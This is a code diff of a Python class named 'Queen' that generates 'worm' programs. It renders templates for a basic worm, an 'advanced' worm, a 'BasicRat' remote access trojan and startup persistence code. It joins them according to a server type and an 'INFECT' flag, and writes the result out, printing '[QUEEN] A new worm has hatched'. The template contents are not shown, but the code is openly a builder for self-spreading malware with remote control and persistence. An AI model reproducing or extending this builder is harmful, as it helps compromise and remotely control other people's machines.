@@ -39,13 +39,81 @@ class Queen:
         )
         return basic_code
     
-    def hatchering(self, **config):
-        if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
-            config.update({"INFECT": True})
-            code = self._make_basic_worm(**config)
-            self.save_worm(code, config["NAME"])
+    def _make_adv_worm(self, **config):
+        basic_rfunc = config.get("basic_rat_func")
+        with open(os.path.join(self.templates_dir, "adv_worm.py"), "r") as f:
+            temp_code = f.read()
+        temp_code = Template(temp_code)
+        adv_code = temp_code.render(SIMPLE_RAT=basic_rfunc)
+        return adv_code
+    
+    def _make_startup(self, name):
+        temp_patch = os.path.join(self.templates_dir, "startup_temp.py")
+        with open(temp_patch, "r") as f:
+            temp_code = f.read()
+        temp_code = Template(temp_code)
+        start_code = temp_code.render(WORM_NAME = name)
+        return start_code
+    
+    def _make_empty_template(self, worm_name):
+        temp_patch = os.path.join(self.templates_dir, worm_name)
+        with open(temp_patch, "r") as f:
+            temp_code = f.read()
+        temp_code = Template(temp_code).render()
+        return temp_code
+        
+    
 
-    def save_worm(self, code, serv_name):
-        with open(os.path.join(self.out_dir, f"{serv_name}_worm.py"), "w") as f:
+    
+    # def hatchering(self, **config):
+    #     if not config.get("INFECT"):
+    #             config.update({"INFECT": False})
+    #     code = self._make_basic_worm(**config)
+    #     if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
+    #         echo_code = self._make_empty_template("echo_temp.py")
+    #         startup = self._make_startup("EchoClient")
+    #         code += echo_code + startup
+    #         self.save_worm(code, f"{config['NAME']}_echo")
+    #     elif config["SERV_TYPE"] == "Adv":
+    #         adv_code = self._make_adv_worm()
+    #         fcode = code + adv_code
+    #         self.save_worm(fcode, f"{config['NAME']}_echo")
+    #     elif config["SERV_TYPE"] == "BasicRat":
+    #         adv_code = self._make_adv_worm()
+    #         rcode = self._make_empty_template("basic_rat.py")
+    #         startup = self._make_startup("BasicRat")
+    #         fcode = code + adv_code + rcode + startup
+    #         self.save_worm(fcode, f"{config['NAME']}_BasicRat.py")
+
+    def hatchering(self, **config):
+        if not config.get("INFECT"):
+                config.update({"INFECT": False})
+        bcode = self._make_basic_worm(**config)
+        acode = ""
+        if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
+            worm_code = self._make_empty_template("echo_temp.py")
+            name = "EchoClient"
+        elif config["SERV_TYPE"] == "BasicRat":
+            config.update({"basic_rat_func" : None})
+            acode = self._make_adv_worm(**config)
+            name = "BasicRat"
+            worm_code = self._make_empty_template("basic_rat.py")
+        elif config["SERV_TYPE"] == "Adv":
+            config.update({"basic_rat_func" : True})
+            acode = self._make_adv_worm(**config)
+            name = "AdvTest"
+            worm_code = ""
+        startup = self._make_startup(config["SERV_TYPE"])
+        fcode = bcode + acode + worm_code + startup
+        self.save_worm(fcode, config["NAME"], name)
+
+        
+
+
+
+
+    def save_worm(self, code, serv_name, name):
+        worm_name = f"{serv_name}_{name}.py"
+        with open(os.path.join(self.out_dir, worm_name), "w") as f:
             f.write(code)
         print("[QUEEN] A new worm has hatched")
